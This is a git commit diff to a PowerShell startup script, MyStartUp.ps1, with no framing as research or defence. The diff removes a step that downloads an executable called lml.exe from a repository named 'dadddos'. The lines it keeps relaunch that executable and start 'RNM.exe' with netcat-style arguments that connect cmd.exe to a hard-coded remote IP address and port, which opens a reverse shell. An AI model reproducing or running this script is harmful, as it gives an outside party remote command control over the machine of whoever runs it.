0fa04445b2fdfc067a88c0e7d49275d3d679d2cd
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-04-19 00:50:46 -0400

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,12 +1,3 @@
-$path = "C:\Users\$env:USERNAME\Downloads\lml.exe"
-
-if (Test-Path $path) {
-    Write-Host "Listo"
-} else {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fullcaleta/dadddos/main/lml.exe" -OutFile $path
-}
-
-
 taskkill /F /IM lml.exe
 C:\Users\ALOOO\Downloads\lml.exe
 Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 47524 -e cmd.exe"
